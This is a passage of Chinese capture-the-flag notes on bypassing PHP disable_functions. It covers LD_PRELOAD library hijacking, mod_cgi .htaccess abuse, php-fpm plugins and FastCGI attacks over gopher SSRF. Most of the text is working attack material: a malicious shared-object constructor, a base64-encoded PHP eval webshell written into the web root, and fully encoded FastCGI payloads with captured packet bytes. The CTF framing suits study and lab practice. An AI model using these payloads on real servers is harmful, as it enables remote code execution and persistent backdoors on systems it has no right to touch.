+提交查询
+-----------------------------14171010023550442333835870523--
+
+
+-->> LD_PRELOAD   linux 环境变量:
+# 动态库加载的优先级高低
+LD_PRELOAD > LIBRARY_PATH > /etc/ld.so.cache > lib >  /usr/lib
+
+# 绕过 disable_functions
+1.攻击后端组件，寻找存在命令注入的web应用常见的后端组件，如 ImageMagick 的魔图漏洞。 bash 的破壳漏洞
+2.寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼
+3.mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通信)
+4.利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。
+
+# 第4种方法，大致步骤如下
+生成一个我们的恶意动态链接库文件
+利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径
+配合php的某个函数去触发我们能的恶意动态链接库文件
+RCE并获取flag
+
+# gcc 编译一个  hack.so 动态库文件
+# include <stdio.h>
+# include <unistd.h>
+# include <stdio.h>
+__attribute__ ((__constructor__)) void angel (void){
+    unsetenv("LD_PRELOAD");     # 重新加载环境变量  
+    system("/readflag > /tmp/sunian");   # 绕过disable_function  读取标志文件
+}
+
+# 上传一个文件 test.php 到网站根目录
+<?php
+  putenv("LD_PRELOAD=/tmp/hack.so");
+  mail("","","","");  # 这个函数不能使用
+  error_log("",1,"","");  # 加上这个
+?>
+# 发送一个get请求  
+?=ant=include(%27test.php%27);  # 包含我们上传的php文件
+# php文件加载我们的hack.so  得到flag
+
+
+-->> Apache Mod CGI:
+.htaccess  文件
+Options +ExecCGI
+AddHandler cgi-script .test  #  .test 文件当作CGI执行
+
+shell.test   # 上传后，需要给shell.test权限
+# !/bin/bash
+echo&&ls  
+# 上传两个文件，然后 url 访问 shell.test   
+# 返回500说明失败  ctfhub不可用
+
+# 使用蚁剑的插件 bypass disable_function    //自己生成反弹 terminal 
+# 直接执行 返回一个命令终端  执行命令 获得标志
+
+-->> php-fpm :
+# 使用蚁剑插件 bypass disable_function 
+# 参数选择
+localhost:9000
+php
+# 开始执行  会在网站根目录生成代理php文件
+连接 .antproxy.php  文件
+打开bash   这个是有执行函数权限的 
+
+-->>  FastCGI  攻击协议: 
+# 工具生成payload
+gopherus 工具生成攻击payload   # windows10 ubuntu 子系统
+python2 gopherus.py --exploit fastcgi  # 第一个命令
+/usr/local/lib/php/PEAR.php  //选择一个服务器上 存在的php文件的绝对路径
+echo PD9waHAgQGV2YWwoJF9QT1NUWydhbmdlbCddKTs/Pg== | base64 -d > /var/www/html/shell.php
+//将base64编码的shell 解码写入shell.php
+
+<?php @eval($_POST['angel']);?>   # php 一句话
+PD9waHAgQGV2YWwoJF9QT1NUWydhbmdlbCddKTs/Pg==  # base64 encode
+
+# 编码一次
+%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%09%01%00%0F%10SERVER_SOFTWAR
+Ego%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_L
+ENGTH139%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%
+20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1BSCRIPT_FILENAME/usr/local/lib/php/PEA
+R.php%0D%01DOCUMENT_ROOT/%00%01%04%00%01%00%00%00%00%01%05%00%01%00%8B%04%00%3C%3Fphp%20system
+%28%27echo%20PD9waHAgQGV2YWwoJF9QT1NUWydhbmdlbCddKTs/Pg%3D%3D%20%7C%20base64%20-d%20%3E%20/var
+/www/html/shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
+
+# 编码两次
+%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%25
+00%2501%2501%2509%2501%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509R
+EMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH139%250E%2504RE
+QUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%
+253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%251BSCRIPT_FILENAME%2F
+usr%2Flocal%2Flib%2Fphp%2FPEAR.php%250D%2501DOCUMENT_ROOT%2F%2500%2501%2504%2500%2501%2500%2
+500%2500%2500%2501%2505%2500%2501%2500%258B%2504%2500%253C%253Fphp%2520system%2528%2527echo%
+2520PD9waHAgQGV2YWwoJF9QT1NUWydhbmdlbCddKTs%2FPg%253D%253D%2520%257C%2520base64%2520-d%2520%25
+3E%2520%2Fvar%2Fwww%2Fhtml%2Fshell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%25
+0A%2527%2529%253B%253F%253E%2500%2500%2500%2500
+
+
+-->> FastCGI 协议漏洞:     
+# 手动制作payload   需要自己搭建 漏洞环境  --> docker vulhub fpm 
+# 向带有漏洞环境的server发送请求包：
+python fastexp2.py 192.168.0.102 -c "<?php var_dump(system('ls /'));?>" /usr/local/lib/php/PEAR.php
+python fastexp2.py 192.168.0.102 -c "<?php var_dump(system('cat /flag_fe8306fcd00b04cc11a4048d745a2180'));?>" /usr/local/lib/php/PEAR.php
+
+# 使用wireshark监听流量 将请求包dump下来
+01 01 61 fc 00 08 00 00  00 01 00 00 00 00 00 00
+01 04 61 fc 01 e7 00 00  11 0b 47 41 54 45 57 41
+59 5f 49 4e 54 45 52 46  41 43 45 46 61 73 74 43
+47 49 2f 31 2e 30 0e 04  52 45 51 55 45 53 54 5f
+4d 45 54 48 4f 44 50 4f  53 54 0f 1b 53 43 52 49
+50 54 5f 46 49 4c 45 4e  41 4d 45 2f 75 73 72 2f
+6c 6f 63 61 6c 2f 6c 69  62 2f 70 68 70 2f 50 45
+41 52 2e 70 68 70 0b 1b  53 43 52 49 50 54 5f 4e
+41 4d 45 2f 75 73 72 2f  6c 6f 63 61 6c 2f 6c 69
+62 2f 70 68 70 2f 50 45  41 52 2e 70 68 70 0c 00
+51 55 45 52 59 5f 53 54  52 49 4e 47 0b 1b 52 45
+51 55 45 53 54 5f 55 52  49 2f 75 73 72 2f 6c 6f
+63 61 6c 2f 6c 69 62 2f  70 68 70 2f 50 45 41 52
+2e 70 68 70 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
+4f 4f 54 2f 0f 0e 53 45  52 56 45 52 5f 53 4f 46
+54 57 41 52 45 70 68 70  2f 66 63 67 69 63 6c 69
+65 6e 74 0b 09 52 45 4d  4f 54 45 5f 41 44 44 52
+31 32 37 2e 30 2e 30 2e  31 0b 04 52 45 4d 4f 54
+45 5f 50 4f 52 54 39 39  38 35 0b 09 53 45 52 56
+45 52 5f 41 44 44 52 31  32 37 2e 30 2e 30 2e 31
+0b 02 53 45 52 56 45 52  5f 50 4f 52 54 38 30 0b
+09 53 45 52 56 45 52 5f  4e 41 4d 45 6c 6f 63 61
+6c 68 6f 73 74 0f 08 53  45 52 56 45 52 5f 50 52
+4f 54 4f 43 4f 4c 48 54  54 50 2f 31 2e 31 0c 10
+43 4f 4e 54 45 4e 54 5f  54 59 50 45 61 70 70 6c
+69 63 61 74 69 6f 6e 2f  74 65 78 74 0e 02 43 4f
+4e 54 45 4e 54 5f 4c 45  4e 47 54 48 33 33 09 1f
+50 48 50 5f 56 41 4c 55  45 61 75 74 6f 5f 70 72
+65 70 65 6e 64 5f 66 69  6c 65 20 3d 20 70 68 70
+3a 2f 2f 69 6e 70 75 74  0f 16 50 48 50 5f 41 44
+4d 49 4e 5f 56 41 4c 55  45 61 6c 6c 6f 77 5f 75
+72 6c 5f 69 6e 63 6c 75  64 65 20 3d 20 4f 6e 01
+04 61 fc 00 00 00 00 01  05 61 fc 00 21 00 00 3c
+3f 70 68 70 20 76 61 72  5f 64 75 6d 70 28 73 79
+73 74 65 6d 28 27 6c 73  20 2f 27 29 29 3b 3f 3e
+01 05 61 fc 00 00 00 00
+
+# 进行第一次编码
+%01%01%61%fc%00%08%00%00%00%01%00%00%00%00%00%00%01%04%61%fc%01%e7%00%00%11%0b%47%41%54%45%57%41%5
+9%5f%49%4e%54%45%52%46%41%43%45%46%61%73%74%43%47%49%2f%31%2e%30%0e%04%52%45%51%55%45%53%54%5f%4d%
+45%54%48%4f%44%50%4f%53%54%0f%1b%53%43%52%49%50%54%5f%46%49%4c%45%4e%41%4d%45%2f%75%73%72%2f%6c%6f%
+63%61%6c%2f%6c%69%62%2f%70%68%70%2f%50%45%41%52%2e%70%68%70%0b%1b%53%43%52%49%50%54%5f%4e%41%4d%45
+%2f%75%73%72%2f%6c%6f%63%61%6c%2f%6c%69%62%2f%70%68%70%2f%50%45%41%52%2e%70%68%70%0c%00%51%55%45%5
+2%59%5f%53%54%52%49%4e%47%0b%1b%52%45%51%55%45%53%54%5f%55%52%49%2f%75%73%72%2f%6c%6f%63%61%6c%2f
+%6c%69%62%2f%70%68%70%2f%50%45%41%52%2e%70%68%70%0d%01%44%4f%43%55%4d%45%4e%54%5f%52%4f%4f%54%2f%0
+f%0e%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%70%68%70%2f%66%63%67%69%63%6c%69%65%6e%74%0b%09%5
+2%45%4d%4f%54%45%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%0b%04%52%45%4d%4f%54%45%5f%50%4f%52%54%3
+9%39%38%35%0b%09%53%45%52%56%45%52%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%0b%02%53%45%52%56%45%5
+2%5f%50%4f%52%54%38%30%0b%09%53%45%52%56%45%52%5f%4e%41%4d%45%6c%6f%63%61%6c%68%6f%73%74%0f%08%53%4
+5%52%56%45%52%5f%50%52%4f%54%4f%43%4f%4c%48%54%54%50%2f%31%2e%31%0c%10%43%4f%4e%54%45%4e%54%5f%54%5
+9%50%45%61%70%70%6c%69%63%61%74%69%6f%6e%2f%74%65%78%74%0e%02%43%4f%4e%54%45%4e%54%5f%4c%45%4e%47%5
+4%48%33%33%09%1f%50%48%50%5f%56%41%4c%55%45%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%20%3d
+%20%70%68%70%3a%2f%2f%69%6e%70%75%74%0f%16%50%48%50%5f%41%44%4d%49%4e%5f%56%41%4c%55%45%61%6c%6c%6f%7
+7%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%20%3d%20%4f%6e%01%04%61%fc%00%00%00%00%01%05%61%fc%00%21%00%00%
+3c%3f%70%68%70%20%76%61%72%5f%64%75%6d%70%28%73%79%73%74%65%6d%28%27%6c%73%20%2f%27%29%29%3b%3f%3e%0
+1%05%61%fc%00%00%00%00
+
+
+# 进行第二次编码
+%2501%2501%2561%25fc%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2561%25fc
+%2501%25e7%2500%2500%2511%250b%2547%2541%2554%2545%2557%2541%2559%255f%2549%254e%2554%2545%2552%2546
+%2541%2543%2545%2546%2561%2573%2574%2543%2547%2549%252f%2531%252e%2530%250e%2504%2552%2545%2551%255
+5%2545%2553%2554%255f%254d%2545%2554%2548%254f%2544%2550%254f%2553%2554%250f%251b%2553%2543%2552%254
+9%2550%2554%255f%2546%2549%254c%2545%254e%2541%254d%2545%252f%2575%2573%2572%252f%256c%256f%2563%25
+61%256c%252f%256c%2569%2562%252f%2570%2568%2570%252f%2550%2545%2541%2552%252e%2570%2568%2570%250b%2
+51b%2553%2543%2552%2549%2550%2554%255f%254e%2541%254d%2545%252f%2575%2573%2572%252f%256c%256f%2563%2
+561%256c%252f%256c%2569%2562%252f%2570%2568%2570%252f%2550%2545%2541%2552%252e%2570%2568%2570%250c%
+2500%2551%2555%2545%2552%2559%255f%2553%2554%2552%2549%254e%2547%250b%251b%2552%2545%2551%2555%2545%
+2553%2554%255f%2555%2552%2549%252f%2575%2573%2572%252f%256c%256f%2563%2561%256c%252f%256c%2569%2562%
+252f%2570%2568%2570%252f%2550%2545%2541%2552%252e%2570%2568%2570%250d%2501%2544%254f%2543%2555%254d%
+2545%254e%2554%255f%2552%254f%254f%2554%252f%250f%250e%2553%2545%2552%2556%2545%2552%255f%2553%254f%
+2546%2554%2557%2541%2552%2545%2570%2568%2570%252f%2566%2563%2567%2569%2563%256c%2569%2565%256e%2574%
+250b%2509%2552%2545%254d%254f%2554%2545%255f%2541%2544%2544%2552%2531%2532%2537%252e%2530%252e%2530%
+252e%2531%250b%2504%2552%2545%254d%254f%2554%2545%255f%2550%254f%2552%2554%2539%2539%2538%2535%250b%
+2509%2553%2545%2552%2556%2545%2552%255f%2541%2544%2544%2552%2531%2532%2537%252e%2530%252e%2530%252e
+%2531%250b%2502%2553%2545%2552%2556%2545%2552%255f%2550%254f%2552%2554%2538%2530%250b%2509%2553%2545
+%2552%2556%2545%2552%255f%254e%2541%254d%2545%256c%256f%2563%2561%256c%2568%256f%2573%2574%250f%2508
+%2553%2545%2552%2556%2545%2552%255f%2550%2552%254f%2554%254f%2543%254f%254c%2548%2554%2554%2550%252f
+%2531%252e%2531%250c%2510%2543%254f%254e%2554%2545%254e%2554%255f%2554%2559%2550%2545%2561%2570%2570
+%256c%2569%2563%2561%2574%2569%256f%256e%252f%2574%2565%2578%2574%250e%2502%2543%254f%254e%2554%2545%
+254e%2554%255f%254c%2545%254e%2547%2554%2548%2533%2533%2509%251f%2550%2548%2550%255f%2556%2541%254c%
+2555%2545%2561%2575%2574%256f%255f%2570%2572%2565%2570%2565%256e%2564%255f%2566%2569%256c%2565%2520%2
+53d%2520%2570%2568%2570%253a%252f%252f%2569%256e%2570%2575%2574%250f%2516%2550%2548%2550%255f%2541%25
+44%254d%2549%254e%255f%2556%2541%254c%2555%2545%2561%256c%256c%256f%2577%255f%2575%2572%256c%255f%256
+9%256e%2563%256c%2575%2564%2565%2520%253d%2520%254f%256e%2501%2504%2561%25fc%2500%2500%2500%2500%250
+1%2505%2561%25fc%2500%2521%2500%2500%253c%253f%2570%2568%2570%2520%2576%2561%2572%255f%2564%2575%256d
+%2570%2528%2573%2579%2573%2574%2565%256d%2528%2527%256c%2573%2520%252f%2527%2529%2529%253b%253f%253e
+%2501%2505%2561%25fc%2500%2500%2500%2500
+
+# 进行攻击
+?url=gopher://127.0.0.1:9000/_payload 
